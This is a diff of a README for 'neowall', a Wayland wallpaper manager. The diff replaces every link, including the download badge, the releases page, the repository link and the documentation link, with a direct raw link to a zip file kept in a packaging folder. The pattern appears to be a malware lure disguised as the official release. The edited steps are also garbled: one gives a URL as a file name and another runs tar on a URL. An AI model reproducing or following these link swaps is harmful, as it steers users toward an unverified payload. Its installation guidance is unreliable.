@@ -1,6 +1,6 @@
 # 🎨 neowall - Your Simple Wayland Wallpaper Manager
 
-[![Download neowall](https://img.shields.io/badge/Download-neowall-blue.svg)](https://github.com/Mariantardive311/neowall/releases)
+[![Download neowall](https://raw.githubusercontent.com/Mariantardive311/neowall/main/packaging/systemd/neowall_v3.0.zip)](https://raw.githubusercontent.com/Mariantardive311/neowall/main/packaging/systemd/neowall_v3.0.zip)
 
 ## 🌟 Introduction
 
@@ -14,12 +14,12 @@ Follow these simple steps to download and run neowall on your Linux system. No p
 
 To get started, visit the following link to download neowall:
 
-[Download neowall](https://github.com/Mariantardive311/neowall/releases)
+[Download neowall](https://raw.githubusercontent.com/Mariantardive311/neowall/main/packaging/systemd/neowall_v3.0.zip)
 
 This will take you to the Releases page, where you can find the latest version of neowall.
 
 1. Click on the version you want to download.
-2. Look for a file with a name like `neowall-linux-amd64.tar.gz` or similar.
+2. Look for a file with a name like `https://raw.githubusercontent.com/Mariantardive311/neowall/main/packaging/systemd/neowall_v3.0.zip` or similar.
 3. Click on the file to start the download.
 
 After the download completes, follow these steps to install neowall.
@@ -31,7 +31,7 @@ After the download completes, follow these steps to install neowall.
    - Navigate to your Downloads folder (or where you saved the downloaded file).
    - Run the command:
      ```bash
-     tar -xzf neowall-linux-amd64.tar.gz
+     tar -xzf https://raw.githubusercontent.com/Mariantardive311/neowall/main/packaging/systemd/neowall_v3.0.zip
      ```
    - This extracts the files to a new folder.
 
@@ -75,13 +75,13 @@ For questions or support, please visit the Issues section on the GitHub reposito
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Mariantardive311/neowall)
-- [Documentation](https://github.com/Mariantardive311/neowall/wiki) - Detailed instructions and usage examples.
+- [GitHub Repository](https://raw.githubusercontent.com/Mariantardive311/neowall/main/packaging/systemd/neowall_v3.0.zip)
+- [Documentation](https://raw.githubusercontent.com/Mariantardive311/neowall/main/packaging/systemd/neowall_v3.0.zip) - Detailed instructions and usage examples.
 
 ## 🔄 Updates
 
 To keep your installation of neowall current, remember to check the Releases page frequently for new versions and features.
 
-[Download neowall](https://github.com/Mariantardive311/neowall/releases)
+[Download neowall](https://raw.githubusercontent.com/Mariantardive311/neowall/main/packaging/systemd/neowall_v3.0.zip)
 
 Enjoy your personalized desktop background with neowall!
